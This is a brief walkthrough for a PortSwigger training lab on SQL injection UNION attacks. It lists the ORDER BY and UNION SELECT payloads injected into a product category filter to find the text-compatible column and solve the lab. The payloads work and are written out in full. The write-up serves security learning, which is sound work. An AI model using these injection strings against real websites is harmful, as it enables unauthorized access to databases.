https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

Lab objective: `Perform a SQL injection UNION attack that returns an additional row containing the value provided.`

Make the database retrieve the string: 'H5aCsJ' (The string change per lab)
# Lab: SQL injection UNION attack, finding a column containing text

We know that this lab contains a SQL injection vulnerability in the product category filter.

Click product category filter then

1. Find the column number `category=Gifts' ORDER BY 3--`
2. Compatible with string data column `category=-Gifts' UNION SELECT NULL,'A',NULL--` so position 2 can provide data
3. To solve you should give the query is `category=-Gifts' UNION SELECT NULL,'H5aCsJ',NULL--`